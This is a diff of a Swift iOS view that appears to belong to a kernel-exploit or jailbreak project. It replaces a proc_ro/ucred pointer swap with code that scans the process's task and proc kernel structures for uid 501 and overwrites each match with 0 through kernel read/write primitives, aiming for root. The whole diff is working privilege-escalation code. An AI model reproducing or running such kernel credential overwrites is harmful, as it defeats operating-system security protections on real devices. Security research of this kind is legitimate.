@@ -307,129 +307,132 @@ struct BleedingEdgeIOSurfaceKRWView: View {
         
         let proc = ds_get_our_proc()
         guard proc != 0 else { rootResult = "proc = 0"; return }
+        let task = ds_get_our_task()
+        guard task != 0 else { rootResult = "task = 0"; return }
         
-        let procRoAddr = proc + UInt64(off_proc_p_proc_ro)
-        let procRo = ds_kread64(procRoAddr)
-        guard procRo != 0 else { rootResult = "proc_ro = 0"; return }
-        
-        let ucredAddr = procRo + UInt64(off_proc_ro_p_ucred)
-        let ucred = ds_kread64(ucredAddr)
-        guard ucred != 0 else { rootResult = "ucred = 0"; return }
-        
+        let procRo = ds_kread64(proc + UInt64(off_proc_p_proc_ro))
+        let ucred = ds_kread64(procRo + UInt64(off_proc_ro_p_ucred))
         let origUid = ds_kread32(ucred + 0x18)
         
         var report = ""
-        report += String(format: "proc:      0x%llx\n", proc)
-        report += String(format: "proc_ro:   0x%llx\n", procRo)
-        report += String(format: "ucred:     0x%llx\n", ucred)
-        report += String(format: "orig uid:  %d\n", origUid)
-        report += String(format: "rw_pcb:    0x%llx\n\n", ds_get_rw_socket_pcb())
+        report += String(format: "proc:     0x%llx\n", proc)
+        report += String(format: "task:     0x%llx\n", task)
+        report += String(format: "proc_ro:  0x%llx\n", procRo)
+        report += String(format: "ucred:    0x%llx\n", ucred)
+        report += String(format: "orig uid: %d\n\n", origUid)
         
         // ============================================================
-        // STRATEGY: Test what's writable, step by step
-        // Each test is SAFE — we only write values we can verify
-        // and restore immediately if something goes wrong
+        // EXPERIMENT: Scan task struct for security_token / audit_token
+        // These contain uid/gid used for permission checks
+        // task struct is on HEAP — should be writable!
         // ============================================================
         
-        // --- TEST A: Can we write DIFFERENT value to proc_ro ucred field? ---
-        report += "=== TEST A: Write to proc_ro ucred field ===\n"
-        let origUcredPtr = ds_kread64(ucredAddr)
-        // Write a DIFFERENT value to truly test (use kernel ucred as test)
-        let kernProc0 = procbypid(0)
-        let kernProcRo0 = ds_kread64(kernProc0 + UInt64(off_proc_p_proc_ro))
-        let kernUcred0 = ds_kread64(kernProcRo0 + UInt64(off_proc_ro_p_ucred))
+        report += "=== SCANNING TASK STRUCT FOR UID=501 ===\n"
         
-        ds_kwrite64(ucredAddr, kernUcred0)  // Try write kernel ucred ptr
-        let verifyA = ds_kread64(ucredAddr)
-        let procRoWritable = (verifyA == kernUcred0)
+        var taskMatches: [(offset: Int, val: UInt32, next: UInt32, next2: UInt32, next3: UInt32)] = []
         
-        if procRoWritable {
-            // It actually worked! Check getuid
-            let testUid = getuid()
-            report += String(format: "proc_ro ucred field: TRULY WRITABLE ✅\n")
-            report += String(format: "getuid() = %d\n", testUid)
-            if testUid == 0 {
-                report += "\n🎉🎉🎉 ROOT ACHIEVED! 🎉🎉🎉\n"
+        for offset in stride(from: 0, to: 0x600, by: 4) {
+            let val = ds_kread32(task + UInt64(offset))
+            if val == 501 {
+                let n1 = ds_kread32(task + UInt64(offset + 4))
+                let n2 = ds_kread32(task + UInt64(offset + 8))
+                let n3 = ds_kread32(task + UInt64(offset + 12))
+                taskMatches.append((offset, val, n1, n2, n3))
+                report += String(format: "  task+0x%03x: %d %d %d %d\n", offset, val, n1, n2, n3)
+            }
+        }
+        
+        report += String(format: "\nFound %d uid=501 in task (0x600 range)\n\n", taskMatches.count)
+        
+        // ============================================================
+        // EXPERIMENT: Try writing uid=0 at each task offset
+        // This is SAFE: task struct is on writable heap
+        // Worst case: write succeeds but doesn't affect getuid()
+        // ============================================================
+        
+        if !taskMatches.isEmpty {
+            report += "=== WRITING uid=0 TO TASK OFFSETS ===\n"
+            
+            for match in taskMatches {
+                let addr = task + UInt64(match.offset)
+                ds_kwrite32(addr, 0)
+                let readBack = ds_kread32(addr)
+                
+                if readBack == 0 {
+                    // Also zero next field if it was 501 (likely gid)
+                    if match.next == 501 {
+                        ds_kwrite32(addr + 4, 0)
+                    }
+                    
+                    let uid = getuid()
+                    report += String(format: "  task+0x%03x: ✅ written! getuid()=%d\n", match.offset, uid)
+                    
+                    if uid == 0 {
+                        report += "\n🎉🎉🎉 ROOT VIA TASK! 🎉🎉🎉\n"
+                        report += String(format: "Offset: task+0x%03x\n", match.offset)
+                        rootResult = report
+                        return
+                    }
+                } else {
+                    report += String(format: "  task+0x%03x: ❌ blocked (still %d)\n", match.offset, readBack)
+                }
+            }
+            
+            // Check getuid one more time after all writes
+            let finalUid = getuid()
+            report += String(format: "\nFinal getuid(): %d\n", finalUid)
+            if finalUid == 0 {
+                report += "\n🎉🎉🎉 ROOT! 🎉🎉🎉\n"
                 rootResult = report
                 return
             }
-            // Restore if getuid didn't change
-            ds_kwrite64(ucredAddr, origUcredPtr)
-            report += "Restored (getuid didn't reflect change)\n\n"
-        } else {
-            report += String(format: "proc_ro ucred field: PPL BLOCKED ❌\n")
-            report += String(format: "(wrote 0x%llx, read back 0x%llx)\n\n", kernUcred0, verifyA)
         }
         
-        if !procRoWritable {
-            // proc_ro is PPL protected — use proc_ro pointer swap
-            report += "=== TEST B: proc_ro POINTER swap ===\n"
-            report += "(proc_ro content is PPL-protected, but pointer in proc is not)\n\n"
-            
-            // We need safe heap memory for fake structures.
-            // Use rw_socket_pcb + 0x200 area (after the icmp6 filter data)
-            // This is KNOWN writable heap (our exploit uses it)
-            let rwPcb = ds_get_rw_socket_pcb()
-            guard rwPcb != 0 else {
-                report += "❌ rw_socket_pcb = 0\n"
-                rootResult = report
-                return
+        // ============================================================
+        // EXPERIMENT: Scan proc struct for uid=501
+        // ============================================================
+        
+        report += "\n=== SCANNING PROC STRUCT FOR UID=501 ===\n"
+        
+        var procMatches: [(offset: Int, val: UInt32, next: UInt32)] = []
+        
+        for offset in stride(from: 0, to: 0x400, by: 4) {
+            let val = ds_kread32(proc + UInt64(offset))
+            if val == 501 {
+                let n1 = ds_kread32(proc + UInt64(offset + 4))
+                procMatches.append((offset, val, n1))
+                report += String(format: "  proc+0x%03x: %d %d\n", offset, val, n1)
             }
-            
-            // Safe offset: pcb is ~0x400 bytes, use +0x300 for our data
-            // Actually this is risky too. Let's use a different approach:
-            // Scan for a KNOWN EMPTY region near our proc
-            
-            // Better: just test if we can write to proc_ro[4] (ucred ptr)
-            // by writing a DIFFERENT valid ucred pointer
-            // We'll point it to kernel_proc's ucred (uid=0)
-            
-            report += "Looking for kernel_proc (pid=0) ucred...\n"
-            let kernProc = kernProc0
-            let kernProcRo = kernProcRo0
-            let kernUcred = kernUcred0
-            let kernUid = ds_kread32(kernUcred + 0x18)
-            
-            report += String(format: "kernel proc:    0x%llx\n", kernProc)
-            report += String(format: "kernel proc_ro: 0x%llx\n", kernProcRo)
-            report += String(format: "kernel ucred:   0x%llx\n", kernUcred)
-            report += String(format: "kernel uid:     %d\n\n", kernUid)
-            
-            // Now: swap our proc_ro pointer to kernel's proc_ro
-            // This gives us kernel's ucred (uid=0) without creating fake structs!
-            report += "⚡ Swapping proc_ro → kernel proc_ro...\n"
-            report += String(format: "   0x%llx → 0x%llx\n\n", procRo, kernProcRo)
-            
-            ds_kwrite64(procRoAddr, kernProcRo)
-            
-            // Verify
-            let newProcRo = ds_kread64(procRoAddr)
-            let newUcred = ds_kread64(newProcRo + UInt64(off_proc_ro_p_ucred))
-            let newUid = ds_kread32(newUcred + 0x18)
-            let realUid = getuid()
-            
-            report += String(format: "New proc_ro: 0x%llx\n", newProcRo)
-            report += String(format: "New ucred:   0x%llx\n", newUcred)
-            report += String(format: "Kernel uid:  %d\n", newUid)
-            report += String(format: "getuid():    %d\n\n", realUid)
-            
-            if realUid == 0 {
-                report += "🎉🎉🎉 ROOT ACHIEVED! 🎉🎉🎉\n"
-                report += "getuid() = 0 — YOU ARE ROOT!\n"
-            } else if newUid == 0 {
-                report += "⚠️ Kernel chain shows uid=0 but getuid() still \(realUid)\n"
-                report += "May need to also update task credentials.\n"
-                // Don't restore — let user see the state
-            } else {
-                report += "❌ Swap didn't work or was reverted\n"
-                // Restore
-                ds_kwrite64(procRoAddr, procRo)
-                report += "Restored original proc_ro.\n"
-            }
-        } else {
-            // proc_ro IS writable — already handled above in Test A
-            report += "Already handled in Test A above.\n"
         }
+        
+        if !procMatches.isEmpty {
+            report += "\n=== WRITING uid=0 TO PROC OFFSETS ===\n"
+            
+            for match in procMatches {
+                let addr = proc + UInt64(match.offset)
+                ds_kwrite32(addr, 0)
+                let readBack = ds_kread32(addr)
+                
+                if readBack == 0 {
+                    if match.next == 501 {
+                        ds_kwrite32(addr + 4, 0)
+                    }
+                    let uid = getuid()
+                    report += String(format: "  proc+0x%03x: ✅ written! getuid()=%d\n", match.offset, uid)
+                    if uid == 0 {
+                        report += "\n🎉🎉🎉 ROOT VIA PROC! 🎉🎉🎉\n"
+                        rootResult = report
+                        return
+                    }
+                } else {
+                    report += String(format: "  proc+0x%03x: ❌ blocked\n", match.offset)
+                }
+            }
+        }
+        
+        report += "\n=== DONE ===\n"
+        report += "No root achieved. All results logged.\n"
+        report += "Send screenshot to Kiro for analysis.\n"
         
         rootResult = report
     }
